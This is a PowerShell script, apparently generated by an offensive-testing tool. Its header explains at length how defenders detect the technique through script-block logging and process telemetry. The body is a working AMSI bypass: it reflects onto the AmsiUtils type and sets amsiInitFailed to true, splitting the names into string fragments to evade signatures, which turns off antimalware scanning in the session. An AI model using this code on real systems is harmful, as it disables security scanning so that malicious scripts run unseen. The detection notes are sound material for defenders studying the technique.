# =============================================================================
#  AMSI in-process disabling stub — generated by HackPit for an AUTHORIZED test.
#
#  This is a MANAGED-REFLECTION stub: it sets the AMSI init-failed flag on the
#  running process. It does NOT open a process handle and does NOT patch
#  amsi.dll in memory, so the memory-patch telemetry you may expect is not what
#  catches this. What actually catches it is below.
#
#  WHAT A DEFENDER STILL SEES (this header is not decoration; it is the point):
#    * THE SCRIPT IS READ BEFORE IT TAKES EFFECT. This content is handed to AMSI
#      on its way to the engine, and script-block logging keeps a verbatim copy
#      (PowerShell EventCode 4104, 4103). Public rules match exactly this shape
#      — reflection onto the AMSI utility type and its init-failed field. The
#      attempt is recorded whether or not it succeeds.
#    * The hosting process still starts and is still attributed to its parent
#      (Security 4688 / Sysmon 1).
#    * AMSI is ONE inspection point, not the audit trail. Setting the flag stops
#      content scanning from here on. It does not stop process, image-load, or
#      network telemetry, and it does not remove the parent-process chain.
#
#  TRADEOFF: fragile across patch levels and AMSI versions, and it cannot
#  un-log itself — by the time it runs, it has already been recorded.
#
#  ATT&CK: T1685 (Disable or Modify Tools) — see the detection footprint
#  returned alongside this artifact for the full blue-team view.
# =============================================================================

Set-StrictMode -Version Latest

# The reference to the AMSI initialisation state that the scan path consults.
# Resolved at runtime rather than hardcoded, so this stub carries no offsets
# that would tie it to one build.
$ref = [Ref].Assembly.GetType(
    'System.Management.Automation.' + 'Amsi' + 'Utils'
)
if ($null -eq $ref) {
    Write-Error 'AMSI utility type not resolvable on this host; stub not applied.'
    return
}

$field = $ref.GetField(
    'amsi' + 'InitFailed',
    [Reflection.BindingFlags]'NonPublic,Static'
)
if ($null -eq $field) {
    Write-Error 'AMSI init field not resolvable on this host; stub not applied.'
    return
}

$field.SetValue($null, $true)

Write-Output 'AMSI init state set. Reminder: the write above is itself detected; see the footprint.'
